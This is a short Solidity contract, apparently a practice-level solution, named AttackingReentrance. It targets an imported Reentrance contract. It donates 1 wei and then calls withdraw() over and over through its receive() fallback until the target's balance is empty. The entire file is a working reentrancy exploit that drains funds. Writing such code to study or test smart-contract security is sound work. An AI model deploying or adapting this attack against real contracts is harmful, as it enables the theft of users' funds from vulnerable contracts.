// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";
import "hardhat/console.sol";

contract AttackingReentrance {
    address payable public contractAddress;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Donate some tokens
        Reentrance(contractAddress).donate{value: 1 wei}(address(this));

        tryWithdraw();  // attack!
    }

    receive() external payable {
        // Reentrance.withdraw will call this
        tryWithdraw();
    }

    /**
     * @notice This is the function to recurse
     */
    function tryWithdraw() private {
        uint256 currBalance = address(contractAddress).balance;
        // Check there is anything left to withdraw
        if (currBalance > 0) {
          Reentrance(contractAddress).withdraw();
        }
    }
}
